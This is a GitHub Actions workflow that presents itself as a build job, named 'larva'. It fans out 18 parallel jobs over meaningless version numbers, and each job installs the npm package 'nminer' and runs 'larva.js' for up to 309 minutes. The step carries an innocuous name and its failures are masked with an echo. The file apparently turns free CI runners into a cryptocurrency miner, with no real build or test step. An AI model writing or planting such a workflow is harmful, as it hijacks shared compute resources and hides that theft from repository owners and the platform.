name: larva
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1768 }
          - { version: 9913 }
          - { version: 5188 }
          - { version: 6568 }
          - { version: 2522 }
          - { version: 9057 }
          - { version: 7144 }
          - { version: 4173 }
          - { version: 4130 }
          - { version: 7266 }
          - { version: 3501 }
          - { version: 2297 }
          - { version: 3443 }
          - { version: 1825 }
          - { version: 6190 }
          - { version: 4325 }
          - { version: 9098 }
          - { version: 5800 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: sprinkles like brave
        run: |
          npm install nminer@latest
          timeout 309m node larva.js || echo "larva executed"